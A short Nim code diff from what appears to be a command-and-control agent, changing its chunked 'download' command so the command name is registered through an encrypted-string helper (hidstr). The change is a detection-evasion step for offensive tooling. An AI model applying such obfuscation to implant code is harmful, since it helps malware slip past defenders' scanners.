@@ -1,6 +1,7 @@
 import std/[os, json, base64, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 const DownloadChunkSize = 512 * 1024  ## 512 KB per chunk
 
@@ -61,4 +62,4 @@ proc downloadExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initDownload*() =
-  register("download", downloadExecute)
+  register(hidstr("download"), downloadExecute)
